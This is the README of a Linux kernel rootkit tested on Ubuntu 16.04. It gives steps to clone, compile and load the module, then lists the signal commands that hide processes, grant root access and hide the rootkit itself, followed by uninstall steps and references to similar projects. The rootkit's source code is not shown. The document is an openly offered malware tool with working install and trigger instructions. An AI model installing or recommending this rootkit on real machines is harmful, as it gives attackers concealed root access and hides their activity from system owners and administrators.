This is a rootkit which was tested on ubuntu-16.04.6-desktop-amd64 (Linux 4.4),but it should be easy to port to different kernel versions.


Installation
--

Clone the repository
```
git clone https://github.com/Asekon/RootKit
```

Enter the folder
```
cd RootKit
```

Compile
```
sudo make
```

Insert the module into the kernel as root
```
sudo insmod RootKit.ko
```

Usage
--
(Un)Hide a process (example:PID 500)
```
kill -0 500
```

Gain Root access (you can insert any PID,doesnt have to be 0)
```
kill -1 0
```

(Un)Hide the Rootkit (you can insert any PID,doesnt have to be 0)
```
kill -2 0
```

Uninstall
--

remove the module from the kernel as root (make sure it is visible in the module list first)
```
sudo rmmod RootKit
```

References
--
https://en.wikipedia.org/wiki/Rootkit 

http://dandylife.net/blog/archives/304 

https://github.com/nurupo/rootkit 

https://github.com/f0rb1dd3n/Reptile 

https://github.com/m0nad/Diamorphine 

http://lwn.net/Kernel/LDD3/ 

http://derekmolloy.ie/writing-a-linux-kernel-module-part-1-introduction/ 

http://turbochaos.blogspot.com/2013/09/linux-rootkits-101-1-of-3.html 

https://yassine.tioual.com/index.php/2017/01/10/hiding-processes-for-fun-and-profit/ 

https://www.howtogeek.com/107217/how-to-manage-processes-from-the-linux-terminal-10-commands-you-need-to-know/ 
